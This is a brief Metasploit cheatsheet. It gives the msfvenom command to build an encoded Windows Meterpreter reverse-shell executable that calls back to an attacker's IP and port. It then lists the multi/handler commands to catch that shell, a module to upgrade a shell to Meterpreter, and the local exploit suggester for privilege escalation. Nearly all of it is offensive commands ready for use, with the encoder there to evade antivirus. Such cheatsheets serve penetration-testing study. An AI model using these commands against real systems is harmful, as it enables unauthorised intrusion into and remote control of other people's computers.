# Metasploit Cheatsheet

## Create Windows Meterpreter Reverse Shell Payload
`msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe`

## Catch a Reverse Shell
`use exploit/multi/handler`

`set PAYLOAD windows/meterpreter/reverse_tcp`

`set LHOST your-ip`

`set LPORT listening-port`

`run`

## Upgrade to Meterpreter Shell
`post/multi/manage/shell_to_meterpreter`

## Find Local exploits
`meterpreter> run post/multi/recon/local_exploit_suggester SHOWDESCRIPTION=true`